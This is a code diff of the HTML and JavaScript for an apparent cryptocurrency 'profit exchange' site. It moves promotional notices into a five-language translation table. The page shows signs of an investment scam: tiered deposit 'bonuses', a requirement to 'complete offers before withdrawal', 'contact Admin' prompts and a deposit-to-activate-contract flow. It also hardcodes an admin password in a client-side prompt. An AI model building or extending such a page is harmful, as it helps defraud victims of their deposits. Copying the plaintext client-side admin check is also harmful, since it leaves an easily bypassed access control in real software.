@@ -24,7 +24,6 @@
         #adminPanel { position: fixed; inset: 0; background: #0b0e11; z-index: 10001; display: none; padding: 20px; overflow-y: auto; }
         .req-card { background: #1e2329; padding: 15px; border-radius: 12px; margin-bottom: 12px; border: 1px solid #333; }
         .history-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #333; font-size: 13px; }
-        /* Style cho marquee */
         marquee { display: block; width: 100%; }
     </style>
 </head>
@@ -51,18 +50,8 @@
 
     <div id="authPage" style="position:fixed; inset:0; background:var(--bg); z-index:8000; display:none; flex-direction:column; justify-content:center; padding:30px;">
         <div style="text-align: center; margin-bottom: 30px;"><div class="logo-circle" style="width:60px; height:60px; margin: 0 auto; font-size: 30px;">₿</div></div>
-        <div id="regForm">
-            <input type="email" id="regEmail" class="login-input" placeholder="Email">
-            <input type="password" id="regPass" class="login-input" placeholder="Password">
-            <button class="login-btn" onclick="handleRegister()">REGISTER</button>
-            <p style="text-align:center; color:var(--gray); font-size:13px; margin-top:20px;" onclick="switchAuth(false)">Have account? Login</p>
-        </div>
-        <div id="logForm" style="display:none;">
-            <input type="email" id="logEmail" class="login-input" placeholder="Email">
-            <input type="password" id="logPass" class="login-input" placeholder="Password">
-            <button class="login-btn" onclick="handleLogin()">LOGIN</button>
-            <p style="text-align:center; color:var(--gray); font-size:13px; margin-top:20px;" onclick="switchAuth(true)">New here? Register</p>
-        </div>
+        <div id="regForm"><input type="email" id="regEmail" class="login-input" placeholder="Email"><input type="password" id="regPass" class="login-input" placeholder="Password"><button class="login-btn" onclick="handleRegister()">REGISTER</button><p style="text-align:center; color:var(--gray); font-size:13px; margin-top:20px;" onclick="switchAuth(false)">Have account? Login</p></div>
+        <div id="logForm" style="display:none;"><input type="email" id="logEmail" class="login-input" placeholder="Email"><input type="password" id="logPass" class="login-input" placeholder="Password"><button class="login-btn" onclick="handleLogin()">LOGIN</button><p style="text-align:center; color:var(--gray); font-size:13px; margin-top:20px;" onclick="switchAuth(true)">New here? Register</p></div>
     </div>
 
     <div class="header">
@@ -107,22 +96,16 @@
     <div id="exchange" class="page">
         <div class="card">
             <div style="background:#000; border:1px solid var(--gold); padding:10px; margin-bottom:15px; overflow:hidden;">
-                <marquee scrollamount="4">THÔNG BÁO: Ưu đãi nạp lần đầu nhận ngay bonus gấp đôi. Liên hệ Admin để nhận thưởng!</marquee>
+                <marquee scrollamount="4"><div id="l_notice"></div></marquee>
             </div>
             <h3 id="l_ex_t" style="color: var(--gold);">Profit Exchange</h3>
             <input type="text" id="ex_eth_val" class="login-input" readonly value="0.000000 ETH">
             <div style="text-align: center; margin: 10px 0;">⬇️</div>
             <input type="text" id="ex_usdt_res" class="login-input" style="color:var(--green); font-weight:bold;" readonly value="0.00 USDT">
             <button id="l_ex_btn" class="login-btn" onclick="processExchange()">TRANSFER TO BALANCE</button>
-            
             <div style="margin-top:20px; padding:15px; border:1.5px solid var(--red); border-radius:10px; color:#ff4d4d; font-size:12px; line-height:1.7; font-weight: 500; background: rgba(246, 70, 93, 0.05); height: 150px; overflow: hidden;">
                 <marquee behavior="scroll" direction="up" scrollamount="2" height="100%" onmouseover="this.stop()" onmouseout="this.start()">
-                    1. nạp đầu 500$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.000$<br>
-                    2. nạp đầu 1.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.500$<br>
-                    3. nạp đầu 2.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 2.500$<br>
-                    4. nạp đầu 3.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 3.500$<br>
-                    5. nạp đầu 4.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 4.500$<br>
-                    <b style="color: #fff; display: block; margin-top: 8px;">KHUYẾN KHÍCH QUÝ KHÁCH HOÀN THÀNH CÁC ƯU ĐÃI TRƯỚC KHI RÚT TIỀN!</b>
+                    <div id="l_rules"></div>
                 </marquee>
             </div>
         </div>
@@ -132,18 +115,13 @@
         <div class="card"><h3 id="l_nav_w" style="color: var(--gold);">Withdraw USDT</h3>
             <h2 id="usdt_W" style="color: var(--green); margin: 10px 0;">$ 0.00</h2>
             <select id="w_network" class="login-input" style="border: 1px solid var(--gold); color: var(--gold);">
-                <option value="BEP20">Binance Smart Chain (BEP20)</option>
-                <option value="TRC20">Tron (TRC20)</option>
-                <option value="ERC20">Ethereum (ERC20)</option>
+                <option value="BEP20">Binance Smart Chain (BEP20)</option><option value="TRC20">Tron (TRC20)</option><option value="ERC20">Ethereum (ERC20)</option>
             </select>
             <input type="text" id="w_address" class="login-input" placeholder="Wallet Address">
             <input type="number" id="w_amount" class="login-input" placeholder="Min 10 USDT">
             <button class="login-btn" style="background: var(--red); color: #fff;" onclick="handleWithdraw()">WITHDRAW NOW</button>
         </div>
-        <div class="card">
-            <h4 style="color: var(--gold); margin-bottom: 10px;">Transaction History</h4>
-            <div id="history_list"></div>
-        </div>
+        <div class="card"><h4 style="color: var(--gold); margin-bottom: 10px;">Transaction History</h4><div id="history_list"></div></div>
     </div>
 
     <div id="account" class="page">
@@ -153,8 +131,7 @@
             <button id="l_acc_btn" class="login-btn" onclick="handleSecurityAccess()">VERIFY</button>
         </div>
         <div id="account_content" style="display: none;">
-            <div class="card"><p style="color: var(--gray); font-size: 13px;">Email: <span id="accEmailText">...</span></p>
-            <h1 id="usdt_A" style="font-size: 32px; margin: 10px 0; color:var(--gold);">$ 0.00</h1></div>
+            <div class="card"><p style="color: var(--gray); font-size: 13px;">Email: <span id="accEmailText">...</span></p><h1 id="usdt_A" style="font-size: 32px; margin: 10px 0; color:var(--gold);">$ 0.00</h1></div>
             <button class="login-btn" style="background:var(--red); color:#fff;" onclick="handleLogout()">LOGOUT</button>
         </div>
     </div>
@@ -180,13 +157,23 @@
     </script>
     <script>
         const trans = {
-            en: { welcome: "Welcome", balance: "Balance (USDT)", start: "Start", addr_t: "Deposit USDT (BEP20):", btn_dep: "ACTIVATE CONTRACT", nav_h: "Home", nav_e: "Exchange", nav_w: "Withdraw", nav_a: "Account", ex_t: "Profit Exchange", ex_btn: "TRANSFER TO BALANCE", acc_t: "Security Vault", acc_btn: "VERIFY" },
-            vi: { welcome: "Chào mừng", balance: "Số dư (USDT)", start: "Bắt đầu", addr_t: "Nạp USDT (BEP20):", btn_dep: "KÍCH HOẠT HỢP ĐỒNG", nav_h: "Trang chủ", nav_e: "Quy đổi", nav_w: "Rút tiền", nav_a: "Tài khoản", ex_t: "Quy đổi lợi nhuận", ex_btn: "CHUYỂN VỀ VỐN", acc_t: "Két sắt bảo mật", acc_btn: "XÁC MINH" },
-            zh: { welcome: "欢迎", balance: "余额 (USDT)", start: "开始", addr_t: "充值 USDT (BEP20):", btn_dep: "激活合约", nav_h: "首页", nav_e: "兑换", nav_w: "提现", nav_a: "账户", ex_t: "利润兑换", ex_btn: "转入余额", acc_t: "安全库", acc_btn: "验证" },
-            es: { welcome: "Bienvenido", balance: "Saldo (USDT)", start: "Inicio", addr_t: "Depósito (BEP20):", btn_dep: "ACTIVAR CONTRATO", nav_h: "Inicio", nav_e: "Canje", nav_w: "Retirar", nav_a: "Cuenta", ex_t: "Canje de Ganancias", ex_btn: "TRANSFERIR", acc_t: "Bóveda", acc_btn: "VERIFICAR" },
-            pt: { welcome: "Bem-vindo", balance: "Saldo (USDT)", start: "Início", addr_t: "Depósito (BEP20):", btn_dep: "ATIVAR CONTRATO", nav_h: "Início", nav_e: "Troca", nav_w: "Retirar", nav_a: "Conta", ex_t: "Troca de Lucro", ex_btn: "TRANSFERIR", acc_t: "Cofre", acc_btn: "VERIFICAR" }
+            en: { welcome: "Welcome", balance: "Balance (USDT)", start: "Start", addr_t: "Deposit USDT (BEP20):", btn_dep: "ACTIVATE CONTRACT", nav_h: "Home", nav_e: "Exchange", nav_w: "Withdraw", nav_a: "Account", ex_t: "Profit Exchange", ex_btn: "TRANSFER TO BALANCE", acc_t: "Security Vault", acc_btn: "VERIFY",
+                notice: "NOTICE: First deposit bonus doubled. Contact Admin!",
+                rules: "1. Deposit $500, get $1000 bonus.<br>2. Deposit $1000, get $1500 bonus.<br>3. Deposit $2000, get $2500 bonus.<br>4. Deposit $3000, get $3500 bonus.<br>5. Deposit $4000, get $4500 bonus.<br><b style='color:#fff;'>COMPLETE OFFERS BEFORE WITHDRAWAL!</b>" },
+            vi: { welcome: "Chào mừng", balance: "Số dư (USDT)", start: "Bắt đầu", addr_t: "Nạp USDT (BEP20):", btn_dep: "KÍCH HOẠT HỢP ĐỒNG", nav_h: "Trang chủ", nav_e: "Quy đổi", nav_w: "Rút tiền", nav_a: "Tài khoản", ex_t: "Quy đổi lợi nhuận", ex_btn: "CHUYỂN VỀ VỐN", acc_t: "Két sắt bảo mật", acc_btn: "XÁC MINH",
+                notice: "THÔNG BÁO: Ưu đãi nạp lần đầu nhận ngay bonus gấp đôi. Liên hệ Admin!",
+                rules: "1. Nạp đầu 500$, phần thưởng là 1.000$<br>2. Nạp đầu 1.000$, phần thưởng là 1.500$<br>3. Nạp đầu 2.000$, phần thưởng là 2.500$<br>4. Nạp đầu 3.000$, phần thưởng là 3.500$<br>5. Nạp đầu 4.000$, phần thưởng là 4.500$<br><b style='color:#fff;'>HOÀN THÀNH ƯU ĐÃI TRƯỚC KHI RÚT TIỀN!</b>" },
+            zh: { welcome: "欢迎", balance: "余额 (USDT)", start: "开始", addr_t: "充值 USDT (BEP20):", btn_dep: "激活合约", nav_h: "首页", nav_e: "兑换", nav_w: "提现", nav_a: "账户", ex_t: "利润兑换", ex_btn: "转入余额", acc_t: "安全库", acc_btn: "验证",
+                notice: "通知：首次存款奖金翻倍。联系管理员！",
+                rules: "1. 充值500$，奖励1000$<br>2. 充值1000$，奖励1500$<br>3. 充值2000$，奖励2500$<br>4. 充值3000$，奖励3500$<br>5. 充值4000$，奖励4500$<br><b style='color:#fff;'>提现前请完成优惠活动！</b>" },
+            es: { welcome: "Bienvenido", balance: "Saldo (USDT)", start: "Inicio", addr_t: "Depósito (BEP20):", btn_dep: "ACTIVAR CONTRATO", nav_h: "Inicio", nav_e: "Canje", nav_w: "Retirar", nav_a: "Cuenta", ex_t: "Canje de Ganancias", ex_btn: "TRANSFERIR", acc_t: "Bóveda", acc_btn: "VERIFICAR",
+                notice: "AVISO: Bono por primer depósito duplicado. ¡Contacte al Admin!",
+                rules: "1. Depósito $500, bono $1000<br>2. Depósito $1000, bono $1500<br>3. Depósito $2000, bono $2500<br>4. Depósito $3000, bono $3500<br>5. Depósito $4000, bono $4500<br><b style='color:#fff;'>¡COMPLETE LAS OFERTAS ANTES DE RETIRAR!</b>" },
+            pt: { welcome: "Bem-vindo", balance: "Saldo (USDT)", start: "Início", addr_t: "Depósito (BEP20):", btn_dep: "ATIVAR CONTRATO", nav_h: "Início", nav_e: "Troca", nav_w: "Retirar", nav_a: "Conta", ex_t: "Troca de Lucro", ex_btn: "TRANSFERIR", acc_t: "Cofre", acc_btn: "VERIFICAR",
+                notice: "AVISO: Bónus de primeiro depósito a dobrar. Contacte o Admin!",
+                rules: "1. Depósito $500, bónus $1000<br>2. Depósito $1000, bónus $1500<br>3. Depósito $2000, bónus $2500<br>4. Depósito $3000, bónus $3500<br>5. Depósito $4000, bónus $4500<br><b style='color:#fff;'>COMPLETE AS OFERTAS ANTES DE LEVANTAR!</b>" }
         };
-        function changeLang() { const l = document.getElementById('langSel').value; const t = trans[l]; for (let key in t) { const el = document.getElementById('l_' + key); if(el) el.innerText = t[key]; } }
+        function changeLang() { const l = document.getElementById('langSel').value; const t = trans[l]; for (let key in t) { const el = document.getElementById('l_' + key); if(el) { if(key === 'notice' || key === 'rules') el.innerHTML = t[key]; else el.innerText = t[key]; } } }
         
         window.openAdminPortal = function() { if (prompt("Manager Key:") === "258369@@") { document.getElementById('adminPanel').style.display = 'block'; loadAdminPanel(); } };
         function loadAdminPanel() {
